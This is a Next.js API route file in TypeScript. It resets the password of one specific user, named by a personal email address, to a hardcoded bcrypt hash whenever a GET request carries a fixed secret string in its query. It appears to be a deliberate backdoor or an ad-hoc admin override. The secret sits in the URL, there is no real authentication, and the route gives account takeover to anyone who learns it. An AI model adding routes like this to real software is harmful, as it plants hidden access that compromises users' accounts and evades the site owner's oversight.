import { NextResponse } from "next/server"
import { prisma } from "@/lib/prisma"

export async function GET(req: Request) {
  const s = new URL(req.url).searchParams.get("s")
  if (s !== "ewp-pw-25") return NextResponse.json({ error: "no" }, { status: 401 })

  await prisma.user.update({
    where: { email: "canerturk333@gmail.com" },
    data: { password: "$2b$12$uCbRD3r.Hbz8RQlqMfcnFuVdd0kjOV/hd9yEZvMJJwmlxHf6B1tCy" },
  })

  return NextResponse.json({ ok: true })
}
